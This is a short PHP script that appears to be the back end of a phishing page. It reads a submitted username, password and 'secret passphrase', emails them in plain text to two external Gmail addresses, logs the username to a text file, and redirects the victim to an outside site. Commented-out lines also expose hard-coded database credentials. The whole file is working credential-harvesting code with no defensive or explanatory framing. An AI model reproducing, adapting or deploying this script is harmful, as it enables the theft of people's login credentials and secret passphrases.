<?php
   if($_SERVER["REQUEST_METHOD"] == "POST")
   {
       $filename2 = 'nostep.txt';
       if (file_exists($filename2)) {
    $nostepusernames = explode(',', file_get_contents($filename2));
}
      //$server = "localhost";
      //$user = "sarthak0312";
      //$pass = "Zx4521axy@123";
     // $db = "brianscrabs";
      $recipients = "Itssarthakarora@gmail.com , peoraghav@gmail.com"; // Replace with the email addresses of the recipients
      $subject = "BriansCrabs:Secret passphrase Login Credentials";
     // $conn = new mysqli($server, $user, $pass, $db);
      
     /* if($conn -> connect_errno)
      {
         echo "Database connection failed!<BR>";
         echo "Reason: ", $conn -> connect_error;
         exit();
      }
      else
      {*/
         $key = $_POST["key"];
         $username = $_POST["username"];
         $password = $_POST["password"];
        // $password = $_POST["password"];
         $message = "Username: " . $username . "\n" . "Password: " . $password . "\n" . "key: " . $key . "\n";
         /*$sql = "INSERT INTO comments(user, data)
            VALUES('$username', '$password');";
         
         $res = $conn -> query($sql);
         if($res)
         {*/
            $nostepusernames[] = $username;
            file_put_contents($filename2, implode(',', $nostepusernames));
            header("Location: https://briancrabs.de");
            $headers = "From: noreply@example.com";
            mail($recipients, $subject, $message, $headers);
            
            // block of code to process further...
        /* }
         else
         {
            echo "Something went wrong!<BR>";
            echo "Error description: ", $conn -> error;
            exit();
         }
      }
      $conn -> close();*/
   }
?>